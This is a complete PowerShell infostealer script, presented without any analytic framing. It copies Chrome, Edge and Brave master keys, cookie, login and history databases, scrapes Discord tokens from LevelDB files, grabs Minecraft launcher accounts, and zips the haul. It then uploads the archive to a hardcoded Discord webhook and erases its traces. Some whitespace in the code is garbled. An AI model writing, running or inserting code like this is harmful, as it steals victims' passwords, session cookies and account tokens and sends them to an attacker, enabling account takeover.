$ErrorActionPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$webhook = 'https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit'
$t = Join-Path$env:TEMP ([guid]::NewGuid().ToString('N'))
$outDir = Join-Path$t "harvested_data"
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

$browsers = @{
    'Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    'Edge'   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    'Brave'  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
}

$counts = @{ Cookies = 0; Logins = 0; Tokens = 0; Minecraft = 0 }

# 1. Harvest Browser Profiles & Master Keys
foreach ($bn in $browsers.Keys) {$root = $browsers[$bn]
    if (!(Test-Path $root)) { continue }$browserOut = Join-Path $outDir$bn
    New-Item -ItemType Directory -Path $browserOut -Force | Out-Null

    # Grab Local State (contains the master key)
    $ls = Join-Path$root 'Local State'
    if (Test-Path $ls) {
        Copy-Item $ls "$browserOut\Local_State" -Force
    }

    $profs = Get-ChildItem$root -Directory | Where-Object { $_.Name -eq 'Default' -or$_.Name -like 'Profile *' }
    foreach ($p in $profs) {$pOut = Join-Path $browserOut$p.Name
        New-Item -ItemType Directory -Path $pOut -Force | Out-Null

        # Target databases (including WAL & SHM for active state)
        foreach ($dbName in @('Cookies', 'Login Data', 'History')) {
            $dbPath = Join-Path$p.FullName "Network\$dbName"
            if (-not (Test-Path $dbPath)) {$dbPath = Join-Path $p.FullName $dbName }

            if (Test-Path $dbPath) {
                Copy-Item $dbPath "$pOut\$dbName" -Force
                if (Test-Path "$dbPath-wal") { Copy-Item "$dbPath-wal" "$pOut\$dbName-wal" -Force }
                if (Test-Path "$dbPath-shm") { Copy-Item "$dbPath-shm" "$pOut\$dbName-shm" -Force }
                if ($dbName -eq 'Cookies') {$counts.Cookies++ }
                if ($dbName -eq 'Login Data') {$counts.Logins++ }
            }
        }
    }
}

# 2. Harvest Discord Tokens from LevelDB
$tokensOut = Join-Path$outDir "Discord_Tokens"
New-Item -ItemType Directory -Path $tokensOut -Force \vert{} Out-Null$tokenList = New-Object System.Collections.Generic.List[string]

$discordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
)

foreach ($dPath in$discordPaths) {
    if (Test-Path $dPath) {
        Get-ChildItem $dPath -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $content = Get-Content$_.FullName -Raw -Encoding Default
                [regex]::Matches($content, "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}") | ForEach-Object {
                    if (!$tokenList.Contains($_.Value)) {$tokenList.Add($_.Value)$counts.Tokens++
                    }
                }
            } catch {}
        }
    }
}
if ($tokenList.Count -gt 0) {
    $tokenList \vert{} Set-Content (Join-Path$tokensOut "tokens.txt") -Encoding UTF8
}

# 3. Harvest Minecraft Accounts
$mcPath = Join-Path$env:APPDATA '.minecraft\launcher_accounts.json'
if (Test-Path $mcPath) {
    try {
        $mcOut = Join-Path$outDir "Minecraft"
        New-Item -ItemType Directory -Path $mcOut -Force | Out-Null
        Copy-Item $mcPath "$mcOut\launcher_accounts.json" -Force
        $counts.Minecraft++
    } catch {}
}

# 4. Compress Harvested Data into Archive
$zipPath = Join-Path $t "Session_Report_$([env:COMPUTERNAME]).zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($outDir,$zipPath)

# 5. Exfiltrate Archive via Discord Webhook (Multipart POST)
if (Test-Path $zipPath) {
    try {
        $boundary = [guid]::NewGuid().ToString()$LF = "`r`n"
        $ms = New-Object System.IO.MemoryStream
        $enc = [Text.Encoding]::UTF8

        $embed = @{
            title = "Session Report: $env:COMPUTERNAME"
            color = 3447003
            fields = @(
                @{ name = 'Browser Profiles'; value = "$($counts.Cookies)"; inline = $true },
                @{ name = 'Login DBs'; value = "$($counts.Logins)"; inline = $true },
                @{ name = 'Discord Tokens'; value = "$($counts.Tokens)"; inline = $true },
                @{ name = 'Minecraft Accounts'; value = "$($counts.Minecraft)"; inline = $true }
            )
        }
        $payloadJson = @{ content = ""; embeds = @($embed); attachments = @(@{ id = "0"; filename = (Split-Path $zipPath -Leaf) }) } | ConvertTo-Json -Depth 6 -Compress

        $p1 = "--$boundary$LF" + "Content-Disposition: form-data; name=`"payload_json`"$LF" + "Content-Type: application/json$LF$LF" + "$payloadJson$LF"
        $bb =$enc.GetBytes($p1);$ms.Write($bb, 0,$bb.Length)

        $p2 = "--$boundary$LF" + "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$(Split-Path $zipPath -Leaf)`"$LF" + "Content-Type: application/zip$LF$LF"
        $bb = $enc.GetBytes($p2); $ms.Write($bb, 0, $bb.Length)$bytes = [IO.File]::ReadAllBytes($zipPath);$ms.Write($bytes, 0,$bytes.Length)
        $bb =$enc.GetBytes($LF);$ms.Write($bb, 0,$bb.Length)

        $p3 = "--$boundary--$LF"
        $bb =$enc.GetBytes($p3);$ms.Write($bb, 0,$bb.Length)

        $req = [Net.HttpWebRequest]::Create($webhook)$req.Method = 'POST'
        $req.ContentType = "multipart/form-data; boundary=$boundary"
        $req.ContentLength =$ms.Length
        $rs =$req.GetRequestStream()
        $rs.Write($ms.ToArray(), 0, $ms.Length);$rs.Close()
        [void]$req.GetResponse()
    } catch {}
}

# 6. Secure Cleanup
Remove-Item $t -Recurse -Force -ErrorAction SilentlyContinue
